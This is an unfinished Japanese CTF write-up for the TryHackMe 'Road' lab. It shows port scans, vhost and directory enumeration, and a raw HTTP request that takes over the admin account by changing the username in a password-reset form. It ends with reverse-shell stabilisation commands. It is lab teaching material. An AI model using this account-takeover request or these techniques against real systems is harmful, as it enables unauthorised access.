# Road CTF

https://tryhackme.com/room/road

## Enumeration

```shell
TARGET=10.201.51.242
sudo bash -c "echo $TARGET   skycouriers.thm >> /etc/hosts"
```

### ポートスキャン

```sh
root@ip-10-201-60-135:~# nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-09-22 01:11 BST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for road.thm (10.201.51.242)
Host is up (0.00029s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 16:FF:E9:07:3E:FB (Unknown)
```

```sh
root@ip-10-201-60-135:~# nmap -sV -p22,80 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-09-22 01:12 BST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for road.thm (10.201.51.242)
Host is up (0.00011s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
MAC Address: 16:FF:E9:07:3E:FB (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

SSH, HTTPのみ。

Webページには、info@skycouriers.thm というメールアドレスがある。

### サブドメイン、VHOST

特に出なかった。

```shell
$ ffuf -u http://skycouriers.thm -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.skycouriers.thm' -fs 19607
```

### ディレクトリ列挙

```sh
root@ip-10-201-77-127:~# dirb http://$TARGET

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Sep 22 01:21:27 2025
URL_BASE: http://10.201.51.242/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.201.51.242/ ----
==> DIRECTORY: http://10.201.51.242/assets/                                                                                                                             
+ http://10.201.51.242/index.html (CODE:200|SIZE:19607)                                                                                                                 
==> DIRECTORY: http://10.201.51.242/phpMyAdmin/                                                                                                                         
+ http://10.201.51.242/server-status (CODE:403|SIZE:278)                                                                                                                
==> DIRECTORY: http://10.201.51.242/v2/                                                                                              
---- Entering directory: http://10.201.51.242/assets/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                               
---- Entering directory: http://10.201.51.242/phpMyAdmin/ ----
+ http://10.201.51.242/phpMyAdmin/ChangeLog (CODE:200|SIZE:41123)                                                                                                       
==> DIRECTORY: http://10.201.51.242/phpMyAdmin/doc/                                                                                                                     
==> DIRECTORY: http://10.201.51.242/phpMyAdmin/examples/                                                                                                                
+ http://10.201.51.242/phpMyAdmin/favicon.ico (CODE:200|SIZE:22486)                                                                                                     
+ http://10.201.51.242/phpMyAdmin/index.php (CODE:200|SIZE:19290)                                                                                                       
==> DIRECTORY: http://10.201.51.242/phpMyAdmin/js/                                                                                                                      
==> DIRECTORY: http://10.201.51.242/phpMyAdmin/libraries/                                                                                                               
+ http://10.201.51.242/phpMyAdmin/LICENSE (CODE:200|SIZE:18092)                                                                                                         
==> DIRECTORY: http://10.201.51.242/phpMyAdmin/locale/                                                                                                                  
+ http://10.201.51.242/phpMyAdmin/README (CODE:200|SIZE:1520)                                                                                                           
+ http://10.201.51.242/phpMyAdmin/robots.txt (CODE:200|SIZE:26)                                                                                                         
==> DIRECTORY: http://10.201.51.242/phpMyAdmin/sql/                                                                                                                     
==> DIRECTORY: http://10.201.51.242/phpMyAdmin/templates/                                                                                                               
==> DIRECTORY: http://10.201.51.242/phpMyAdmin/themes/                                                                                                                  
==> DIRECTORY: http://10.201.51.242/phpMyAdmin/tmp/                                                                                                                     
==> DIRECTORY: http://10.201.51.242/phpMyAdmin/vendor/                                                                                          
---- Entering directory: http://10.201.51.242/v2/ ----
==> DIRECTORY: http://10.201.51.242/v2/admin/                                                                                                                           
+ http://10.201.51.242/v2/index.php (CODE:302|SIZE:20178)                                                                                       
---- Entering directory: http://10.201.51.242/phpMyAdmin/doc/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                              
---- Entering directory: http://10.201.51.242/phpMyAdmin/examples/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                              
---- Entering directory: http://10.201.51.242/phpMyAdmin/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                              
---- Entering directory: http://10.201.51.242/phpMyAdmin/libraries/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                               
---- Entering directory: http://10.201.51.242/phpMyAdmin/locale/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                               
---- Entering directory: http://10.201.51.242/phpMyAdmin/sql/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                              
---- Entering directory: http://10.201.51.242/phpMyAdmin/templates/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                               
---- Entering directory: http://10.201.51.242/phpMyAdmin/themes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                
---- Entering directory: http://10.201.51.242/phpMyAdmin/tmp/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.201.51.242/phpMyAdmin/vendor/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.201.51.242/v2/admin/ ----
+ http://10.201.51.242/v2/admin/index.php (CODE:200|SIZE:32)-----------------
END_TIME: Mon Sep 22 01:21:37 2025
DOWNLOADED: 18448 - FOUND: 10
```

/v2 ディレクトリが見つかる。

## v2

/v2 でログイン画面が表示され、ユーザー登録後にログインできる。

`Right now, only admin has access to this feature. Please drop an email to admin@sky.thm in case of any changes.` から管理者アドレス判明。

パスワードリセット機能で、メールアドレスの部分を管理者アドレスに変更することでパスワード変更できた。

```
POST /v2/lostpassword.php HTTP/1.1
Host: road.thm
Content-Length: 536
Cache-Control: max-age=0
Origin: http://road.thm
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1C0Zz0z4ktHj4fxx
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://road.thm/v2/ResetUser.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=gajdv0qjbp81rnj9f1fjdvuicq; Bookings=0; Manifest=0; Pickup=0; Delivered=0; Delay=0; CODINR=0; POD=0; cu=0
x-forwarded-for: 192.0.0.1
Connection: keep-alive

------WebKitFormBoundary1C0Zz0z4ktHj4fxx
Content-Disposition: form-data; name="uname"

admin@sky.thm
------WebKitFormBoundary1C0Zz0z4ktHj4fxx
Content-Disposition: form-data; name="npass"

thm
------WebKitFormBoundary1C0Zz0z4ktHj4fxx
Content-Disposition: form-data; name="cpass"

thm
------WebKitFormBoundary1C0Zz0z4ktHj4fxx
Content-Disposition: form-data; name="ci_csrf_token"


------WebKitFormBoundary1C0Zz0z4ktHj4fxx
Content-Disposition: form-data; name="send"

Submit
------WebKitFormBoundary1C0Zz0z4ktHj4fxx--
```

続きは後日。

## 権限昇格

## 振り返り

-
-

## シェル安定化メモ

```shell
# python が無くても、python3 でいける場合もある
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm

# Ctrl+Z でバックグラウンドにした後に
stty raw -echo; fg

#（終了後）エコー無効にして入力非表示になっているので
reset

# まず、他のターミナルを開いて rows, columns の値を調べる
stty -a

# リバースシェルで rows, cols を設定する
stty rows 52
stty cols 236

```
